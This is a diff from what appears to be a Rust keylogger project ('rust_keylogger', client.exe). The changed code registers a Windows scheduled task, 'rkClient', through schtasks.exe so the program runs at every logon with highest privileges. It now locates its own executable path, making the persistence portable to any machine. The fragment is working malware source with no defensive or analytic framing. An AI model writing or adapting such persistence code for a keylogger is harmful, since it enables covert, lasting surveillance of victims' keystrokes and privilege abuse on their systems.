@@ -13,10 +13,9 @@ const LOGS_FOLDER_PATH: &str = "./logs/";
 const TASK_CREATED: &str = "TASK_EXISTS";
 
 fn main() {
-
     if !std::path::Path::new(TASK_CREATED).exists() {
         let task_child = std::process::Command::new("schtasks.exe")
-            .args(&["/Create", "/TN", "rkClient", "/TR", "\"F:\\Documents\\RustProjects\\rust_keylogger\\target\\debug\\client.exe\"", "/SC", "ONLOGON", "/RL", "HIGHEST"])
+            .args(&["/Create", "/TN", "rkClient", "/TR", std::env::current_exe().unwrap().to_str().unwrap(), "/SC", "ONLOGON", "/RL", "HIGHEST"])
             .spawn().is_ok();
         std::fs::File::create(TASK_CREATED).is_ok();
     }
